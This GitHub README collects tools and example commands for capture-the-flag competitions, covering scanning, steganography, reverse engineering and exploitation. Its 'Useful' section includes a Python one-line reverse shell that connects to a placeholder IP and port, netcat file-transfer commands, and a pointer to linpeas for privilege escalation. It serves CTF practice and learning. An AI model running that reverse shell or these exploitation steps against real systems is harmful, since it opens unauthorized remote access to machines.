# CTF-tools
Collection of useful tools for CTFs.


## Categories
  - [Web](#web)
  - [Crypto](#crypto)
  - [Steganography](#Steganography)
  - [Binary/Reverse](#binary/reverse)
  - [Other](#other)
  - [Useful](#useful)
  - [to update]

---

## Web

* nmap
```
Example usage : sudo nmap -sS -A -T4 <ip_target> -oN <name_output> -vv
```
* gobuster
```
Example usage for directory/file enum :
                gobuster dir -u <ip_target> --wordlist <path_to_wordlist> -x <extensions>
  where:  * path_to_wordlist can be something like "/usr/share/wordlists/<wordlist>"
          * extensions like php, txt, js, cgi, sh, ...
```
* dirb
* curl
* nikto
```
Example usage: nikto -h <ip_target>
```
* wpscan
* wget 
```
Example usage: wget <url>
```
* golismero
```
Example usage:
golismero scan -i /root/port80.xml -o sub1-port80.html
```
* Burpsuite
---

## Crypto

* [CyberChef](https://gchq.github.io/CyberChef/)
* [RSACtfTool](https://github.com/Ganapati/RsaCtfTool)

---

## Steganography

* steghide
```
Example usage: steghide <command> <file>
  where command can be:   > info
                          > extract 
                          > embed 
```
* [Stegosolve](http://www.caesum.com/handbook/Stegsolve.jar)
* exif
* exiftool
* binwalk
* aperisolve.fr

---

## Binary/Reverse

* checksec
* strings
* ltrace
* strace
* frida
* gdb / gdb-peda
* hexdump (-C option very useful)
* objdump
* apktool
* Jadx -- Java decompiler 
* [Decompile Jar,pyc,exe,class,...](https://www.decompiler.com/)
* [Pwntools](https://github.com/Gallopsled/pwntools/)

---

## Other

* nc -- TCP/IP swiss army knife
* linpeas.sh -- for Linux Privesc
* sudo -l -- to get which files I can run with sudo
* searchsploit -- search through Exploit db archive
```
Example usage: searchsploit OpenSSH 7.2p2
               searchsploit -p 46635  -- it returns the URL of the CVE in exploit db
```
* msfconsole -- the god tool for exploitation


---



## Useful

* sending a file using nc:
```
    client side : nc -lvp <port> > <file>
    server side : nc <ip_server> <port_server> < <file>
```
* sending a file using nc + wget:
```
    client side : nc -lvp <port> < <file>
    server side : wget <ip_server>:<port_server>/<file>

!! [NOTE: protocol will continue after transmission of file (maybe because client side does not receive CRLF sequence). So after a while, just press CTRL+c et voit-là] 
```
* to convert a python script from v.2 to v.3
```
    python3 -m lib2to3 <script>.py -w
```
* connect to server pop3 (port 110) using telnet:
```
    telnet <ip> 110
```
* reverse shell with one line only, using python3:
```
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
* run a simple python3 server:
```
    python -m http.server
```
* create a generic ssl/tls client which establishes a connection to a remote server speaking ssl/tls.
```
Example:    openssl s_client -connect <ip_address>:<port>
    If all it is ok, paste the password and it’s done.
```
* append data to a file: 
```
Example usage: printf "<data>" |cat - <file> > <file_out>
    where data is something like "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00"
```
* [PEM Parser](https://8gwifi.org/PemParserFunctions.jsp)
* view and edit files in hexadecimal or in ASCII
```
hexedit [filename]
```


---




# Contributors

- Francesco Varotto - [@frarotto](https://github.com/francevarotz98/)
- Massimiliano Belluomini - [@massibelluomini](https://github.com/massibelluomini)
- Filippo Giambartolomei - [@filippogiamba](https://github.com/Filippo-arch)
